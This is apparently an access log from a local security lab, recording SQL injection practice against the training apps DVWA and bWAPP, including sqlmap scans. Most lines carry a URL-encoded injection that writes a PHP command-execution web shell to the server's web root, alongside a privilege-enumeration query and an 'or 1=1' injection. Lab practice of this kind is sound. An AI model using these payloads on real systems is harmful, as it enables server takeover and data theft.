::1 - - [11/Nov/2019:14:24:33 +0800] "GET /phpmyadmin/themes/pmahomme/img/b_select.png HTTP/1.1" 200 593 "http://localhost/phpmyadmin/phpmyadmin.css.php?nocache=6088723570ltr&server=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit HTTP/1.1" 200 4670 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:07:37 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1972 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2C%22%3C%3Fphp++%24cmd%3D%24_GET%5B%5C%22cmd%5C%22%5D%3B+%24output+%3Dshell_exec%28%24cmd%29%3B+echo+%24cmd%3B+echo+%5C%22%3Cpre%3E%24output%3C%2Fpre%3E%5C%22%3B%3F%3E%22+into+outfile+%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Ctest.php%22%23+&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:34:57 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:34:57 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:34:57 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:34:57 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:19 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:19 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:19 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:19 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:44 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:44 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:44 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:44 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:53 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:53 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:53 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:35:53 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title= HTTP/1.1" 200 24390 "-" "sqlmap/1.3.3.66#dev (http://sqlmap.org)"
::1 - - [24/Oct/2019:12:46:49 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
